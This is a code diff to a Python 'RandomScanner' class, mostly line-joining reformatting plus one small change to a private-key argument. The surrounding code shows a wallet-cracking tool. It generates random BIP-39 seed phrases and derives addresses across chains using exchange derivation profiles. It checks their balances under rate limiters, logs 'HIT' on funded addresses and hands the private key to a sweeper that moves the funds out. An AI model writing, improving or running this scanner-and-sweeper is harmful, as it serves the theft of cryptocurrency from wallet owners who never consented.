@@ -78,15 +78,11 @@ class RandomScanner:
         self.chains = chains or list(ALL_CHAINS)
         self.hit_logger = hit_logger
         self._api_semaphore = asyncio.Semaphore(api_concurrency)
-        self._btc_semaphore = asyncio.Semaphore(
-            5
-        )  # BTC gets lower concurrency (free APIs are rate-limited)
+        self._btc_semaphore = asyncio.Semaphore(5)  # BTC gets lower concurrency (free APIs are rate-limited)
         # Per-chain rate limiters: serialize balance checks per chain with min interval
         self._chain_locks: dict[str, asyncio.Lock] = {}
         self._chain_last_call: dict[str, float] = {}
-        self._chain_min_interval: dict[
-            str, float
-        ] = {}  # Set in run() after chains are known
+        self._chain_min_interval: dict[str, float] = {}  # Set in run() after chains are known
         self._shutdown = False
         self._stats = ScannerStats()
         self._client: Optional[httpx.AsyncClient] = None  # shared HTTP client
@@ -119,15 +115,9 @@ class RandomScanner:
                     value INTEGER DEFAULT 0
                 )
             """)
-            row_m = db.execute(
-                "SELECT value FROM scanner_stats WHERE key='total_mnemonics'"
-            ).fetchone()
-            row_h = db.execute(
-                "SELECT value FROM scanner_stats WHERE key='total_hits'"
-            ).fetchone()
-            row_e = db.execute(
-                "SELECT value FROM scanner_stats WHERE key='total_errors'"
-            ).fetchone()
+            row_m = db.execute("SELECT value FROM scanner_stats WHERE key='total_mnemonics'").fetchone()
+            row_h = db.execute("SELECT value FROM scanner_stats WHERE key='total_hits'").fetchone()
+            row_e = db.execute("SELECT value FROM scanner_stats WHERE key='total_errors'").fetchone()
             self._stats.total_mnemonics_all_time = row_m[0] if row_m else 0
             self._stats.total_hits_all_time = row_h[0] if row_h else 0
             self._stats.total_errors_all_time = row_e[0] if row_e else 0
@@ -157,8 +147,7 @@ class RandomScanner:
                 "INSERT OR REPLACE INTO scanner_stats (key, value) VALUES (?, ?)",
                 (
                     "total_mnemonics",
-                    self._stats.total_mnemonics_all_time
-                    + self._stats.mnemonics_generated,
+                    self._stats.total_mnemonics_all_time + self._stats.mnemonics_generated,
                 ),
             )
             db.execute(
@@ -214,9 +203,7 @@ class RandomScanner:
             self._chain_locks[chain.name] = asyncio.Lock()
             self._chain_last_call[chain.name] = 0.0
             if chain.chain_type == ChainType.BITCOIN:
-                self._chain_min_interval[chain.name] = (
-                    2.0  # 1 batch/2sec for BTC (7 addresses per batch)
-                )
+                self._chain_min_interval[chain.name] = 2.0  # 1 batch/2sec for BTC (7 addresses per batch)
             elif chain.chain_type == ChainType.SOLANA:
                 self._chain_min_interval[chain.name] = 0.25  # 4 calls/sec for SOL
             else:
@@ -255,10 +242,7 @@ class RandomScanner:
             stop_event.set()
 
         # Start workers + stop checker
-        tasks = [
-            asyncio.create_task(self._worker(i, stop_event))
-            for i in range(self.workers)
-        ]
+        tasks = [asyncio.create_task(self._worker(i, stop_event)) for i in range(self.workers)]
         tasks.append(asyncio.create_task(_stop_checker()))
 
         # Wait for all tasks to complete
@@ -309,9 +293,7 @@ class RandomScanner:
                 self._seen_mnemonics.add(mnemonic)
 
                 # Rotate through provider profiles (Binance, OKX, Gate.io, BTGET, Generic)
-                provider = ALL_PROVIDERS[
-                    self._stats.mnemonics_generated % len(ALL_PROVIDERS)
-                ]
+                provider = ALL_PROVIDERS[self._stats.mnemonics_generated % len(ALL_PROVIDERS)]
 
                 loop = asyncio.get_running_loop()
                 addresses = await loop.run_in_executor(
@@ -380,8 +362,7 @@ class RandomScanner:
                         self._stats.mnemonics_per_sec,
                         self._stats.hits_found,
                         self._stats.api_errors,
-                        self._stats.total_mnemonics_all_time
-                        + self._stats.mnemonics_generated,
+                        self._stats.total_mnemonics_all_time + self._stats.mnemonics_generated,
                         self._stats.total_hits_all_time + self._stats.hits_found,
                     )
 
@@ -399,7 +380,7 @@ class RandomScanner:
             if not chain_cfg or not self._sweeper:
                 return
             sweep_result = await self._sweeper.sweep(
-                private_key_hex=addr.private_key_hex,
+                private_key_hex=addr.private_key_hex or "",
                 chain=chain_cfg,
                 source_address=addr.address,
                 balance_raw=balance_result.balance_raw,
@@ -446,13 +427,9 @@ class RandomScanner:
                     if elapsed < interval:
                         await asyncio.sleep(interval - elapsed)
                     self._chain_last_call[chain_name] = time.monotonic()
-                    results = await self._check_chain_balances(
-                        chain_name, idx_addrs, chain_cfg, results
-                    )
+                    results = await self._check_chain_balances(chain_name, idx_addrs, chain_cfg, results)
             else:
-                results = await self._check_chain_balances(
-                    chain_name, idx_addrs, chain_cfg, results
-                )
+                results = await self._check_chain_balances(chain_name, idx_addrs, chain_cfg, results)
 
         return results
 
@@ -550,9 +527,7 @@ class RandomScanner:
                 from src.modules.crypto.balance.checker import BalanceResult
 
                 addr_list = [a.address for _, a in idx_addrs]
-                batch_results = await batch_check_balances(
-                    addr_list, rotated_cfg, client=self._client
-                )
+                batch_results = await batch_check_balances(addr_list, rotated_cfg, client=self._client)
                 for (idx, addr), br in zip(idx_addrs, batch_results):
                     if br.error:
                         self._stats.api_errors += 1
@@ -614,9 +589,7 @@ class RandomScanner:
                         if existing and existing.balance == 0 and not existing.error:
                             # Use first token as primary for result
                             primary = tokens[0]
-                            token_summary = ", ".join(
-                                f"{t.balance:.4f} {t.token_symbol}" for t in tokens
-                            )
+                            token_summary = ", ".join(f"{t.balance:.4f} {t.token_symbol}" for t in tokens)
                             logger.warning(
                                 "TOKEN HIT! %s on %s: %s",
                                 addr.address[:10],
@@ -644,9 +617,7 @@ class RandomScanner:
     @staticmethod
     def _generate_mnemonic() -> str:
         """Generate a random 12 or 24-word BIP-39 mnemonic."""
-        word_count = random.choice(
-            [Bip39WordsNum.WORDS_NUM_12, Bip39WordsNum.WORDS_NUM_24]
-        )
+        word_count = random.choice([Bip39WordsNum.WORDS_NUM_12, Bip39WordsNum.WORDS_NUM_24])
         return str(Bip39MnemonicGenerator().FromWordsNumber(word_count))
 
     def _handle_shutdown(self) -> None:
